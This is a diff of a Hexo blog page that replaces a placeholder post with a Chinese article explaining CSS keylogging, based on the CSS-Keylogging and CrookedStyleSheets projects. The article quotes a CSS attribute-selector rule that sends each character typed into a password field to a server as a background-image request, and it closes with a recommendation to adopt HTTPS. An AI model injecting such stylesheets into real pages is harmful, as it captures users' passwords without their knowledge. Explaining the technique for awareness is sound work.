@@ -3,7 +3,7 @@
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   
-  <title>我的第一篇博客 | Smile</title>
+  <title>使用Css获取用户密码 | Smile</title>
   <meta name="author" content="John Doe">
 
   
@@ -16,7 +16,7 @@
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="我的第一篇博客">
+  <meta property="og:title" content="使用Css获取用户密码">
   <meta property="og:site_name" content="Smile">
 
   
@@ -65,17 +65,28 @@
     <header>
       
         <div class="icon"></div>
-        <time datetime="2019-10-11T02:13:38.000Z"><a href="/2019/10/11/我的第一篇博客/">2019-10-11</a></time>
+        <time datetime="2019-11-03T00:01:00.000Z"><a href="/2019/11/03/使用Css获取用户密码/">2019-11-03</a></time>
       
       
   
-    <h1 class="title">我的第一篇博客</h1>
+    <h1 class="title">使用Css获取用户密码</h1>
   
 
     </header>
     <div class="entry">
       
-        <p>你好呀！！！</p>
+        <h3 id="不一样的-css"><a href="#不一样的-css" class="headerlink" title="不一样的 css"></a>不一样的 css</h3><p>说到 css，大多数人的第一印象基本上就是用来配置界面样式的，甚至于连语言都称不上，但随着 web 技术的不停发展，其所具有的能力也与日俱新，不再是当初那个仅仅满足最基本布局需求的层叠样式表了，至于新的属性新的功能点笔者也了解不全，在这里也不便展开了。</p>
+<p>话题回到不一样的 css 上，github 上 <a href="https://github.com/jbtronics" target="_blank" rel="noopener">jbtronics</a> 给出了这样一份答案 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="noopener">CrookedStyleSheets</a>，在这里笔者直接给上该项目的<a href="https://github.com/jbtronics/CrookedStyleSheets/blob/master/docs/README.zh.md" target="_blank" rel="noopener">中文文档</a>，该文档上有一段关于输入监测的段落，请详细阅读完，如果早已看过请跳过继续看本文的后续部分。</p>
+<h3 id="css-监听键盘记录"><a href="#css-监听键盘记录" class="headerlink" title="css 监听键盘记录"></a>css 监听键盘记录</h3><p><a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 项目使用 css 监听键盘记录的方式一致，基本上是通过 css 选择器去实现功能，<a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 更为巧妙的使用多重选择器去捕获相应的按键事件。</p>
+<p>核心代码如下:说</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input[type=&quot;password&quot;][value$=&quot;1&quot;] &#123; background-image: url(&quot;http://localhost:3000/1&quot;); &#125;</span><br></pre></td></tr></table></figure>
+
+<p>解释如下：</p>
+<p>当 type 为 ‘password’ 的输入框的输入的最后一个字符为 ‘1’ 时使用 url 为 <code>http://localhost:3000/1</code> 的背景图，css 在这种情况下会尝试进行 get 请求获取资源，这样的话，服务端就能接收到来至客户端发送的 get 请求。</p>
+<p>当 <code>value$=&quot;1&quot;</code> 时，我们可以监听用户输入 <code>1</code>，那如果我们监听键盘上所有的按键字符，那我们是不是就可以监听用户的所有按键输入了？答案是可以，该项目使用 go 脚本遍历 ascii 码表，将所有键盘可输入按键字符均进行捕获，生成如下样式表：</p>
+<p><img src="https://i.loli.net/2019/11/02/nZgTwL9GaHUDY1h.png" alt="code.png"></p>
+<p>当然也可以用使用 nodejs 去生成样式表，至今不明白作者为什么用 node 搭服务器然后用 go 写脚本。。。有兴趣的同学可以将项目 clone 下来跑起来试试。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>为了避免有目的性的劫持注入，请尽快升级 https ，预防这种情况的发生，网络安全无处不在，希望不要选择性的去忽视它。</p>
 
       
     </div>
